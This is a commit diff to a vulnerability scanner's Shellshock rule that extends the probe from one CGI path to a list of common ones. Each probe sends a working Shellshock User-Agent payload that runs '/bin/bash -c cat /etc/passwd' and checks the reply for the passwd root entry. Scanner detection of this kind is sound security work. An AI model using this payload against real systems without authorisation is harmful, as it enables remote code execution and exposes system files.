9a3b351f0f3ec86ea8adbdecf1985e8b59a81afd
dolevf <farhi.dolev@gmail.com>
2020-09-29 18:05:14 -0400

    add more cgi paths

--- rules/vulnerabilities/rule_shellshock.py
+++ rules/vulnerabilities/rule_shellshock.py
@@ -3,6 +3,7 @@ import re
 from core.redis import rds
 from core.triage import Triage
 from core.parser import ScanParser, ConfParser
+from db.db_paths import COMMON_CGI_PATHS
 
 class Rule:
   def __init__(self):
@@ -25,25 +26,29 @@ class Rule:
     if 'http' not in module:
       return
 
-    resp = t.http_request(ip, port, uri='/cgi-bin/status', headers={'User-Agent':"() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'"})
+    for uri in COMMON_CGI_PATHS:
+      
+      resp = t.http_request(ip, port, uri=uri, headers={'User-Agent':"() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'"})
 
-    if not resp:
-      return
+      if not resp:
+        continue
 
-    if re.search('root:[x*]:0:0', resp.text):
-      self.rule_details = 'Remote Code Execution Shellshock'
-      js_data = {
-        'ip': ip,
-        'port': port,
-        'domain': domain,
-        'rule_id': self.rule,
-        'rule_sev': self.rule_severity,
-        'rule_desc': self.rule_description,
-        'rule_confirm': self.rule_confirm,
-        'rule_details': self.rule_details,
-        'rule_mitigation': self.rule_mitigation
-      }
 
-      rds.store_vuln(js_data)
+      if resp and re.search('root:[x*]:0:0', resp.text):
+        self.rule_details = 'Remote Code Execution Shellshock'
+        js_data = {
+          'ip': ip,
+          'port': port,
+          'domain': domain,
+          'rule_id': self.rule,
+          'rule_sev': self.rule_severity,
+          'rule_desc': self.rule_description,
+          'rule_confirm': self.rule_confirm,
+          'rule_details': self.rule_details,
+          'rule_mitigation': self.rule_mitigation
+        }
+
+        rds.store_vuln(js_data)
+        break
 
     return
